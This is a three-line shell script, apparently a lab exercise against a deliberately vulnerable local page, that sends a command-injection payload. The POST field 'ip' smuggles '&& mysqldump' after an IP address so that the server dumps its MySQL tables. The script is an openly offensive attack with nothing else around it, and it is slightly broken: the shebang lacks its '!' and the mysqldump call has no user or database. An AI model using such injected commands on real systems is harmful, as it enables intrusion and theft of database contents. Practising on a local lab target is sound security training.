#/bin/sh

echo -e "\e[92mExecuting Command Injection to dump MySQL Server tables."
curl -X POST -d "ip=1.1.1.1+%26%26+mysqldump+-u&Submit=Submit" http://localhost/low.php
